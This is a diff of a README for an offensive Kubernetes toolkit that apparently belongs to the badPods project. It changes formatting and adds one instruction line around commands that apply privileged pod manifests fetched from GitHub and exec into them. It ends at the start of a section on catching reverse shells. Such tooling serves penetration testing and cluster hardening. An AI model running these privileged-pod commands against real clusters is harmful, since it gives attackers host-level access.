@@ -40,8 +40,10 @@ Create one or more of these resource types and exec into the pod
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
 kubectl exec -it priv-exec-pod -- bash
 ```
-**Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**       
+**Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**
 For the rest of the resource types, there is one added step. Once you create your deployment, cronjob, etc., you need to find the pods that were created by your respective resource. 
+
+Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
 
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/[RESOURCE_TYPE]/priv-exec-[RESOURCE_TYPE].yaml 
@@ -60,7 +62,7 @@ kubectl describe priv-exec-[RESOURCE_TYPE]
 ## Reverse shell pods
 Create one or more of these resources and catch the reverse shell
 
-**Generic resource type creation example***
+**Generic resource type creation example**
 Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
 
 **Step 1: Set up listener**
